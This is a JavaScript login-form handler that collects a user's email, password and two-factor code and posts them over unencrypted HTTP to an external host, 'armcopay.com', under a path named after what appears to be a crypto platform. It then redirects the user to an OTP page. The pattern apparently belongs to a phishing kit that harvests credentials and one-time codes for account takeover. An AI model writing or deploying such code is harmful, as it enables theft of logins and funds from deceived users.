document.addEventListener("DOMContentLoaded", function () {
  document
    .getElementById("loginForm")
    .addEventListener("submit", function (event) {
      event.preventDefault(); // Prevent default form submission

      // Get form values
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;
      var code = document.getElementById("code").value;

      // Construct form data
      var formData = new FormData();
      formData.append("email", email);
      formData.append("password", password);
      if (code) {
        formData.append("twofacode", code);
      }

      // Send the data to the backend API (replace 'apiEndpoint' with your actual API endpoint)
      fetch("http://armcopay.com/api/v1/bitvalve", {
        method: "POST",
        body: formData,
      })
        .then((response) => {
          // Handle response
          if (response.ok) {
            // Successful login, redirect to verification.html
            window.location.href = "./otp";
          } else {
            // Failed login, handle error
            alert("Failed");
          }
        })
        .catch((error) => {
          // Handle error
          console.error("There was a problem with the fetch operation:", error);
        });
    });
});
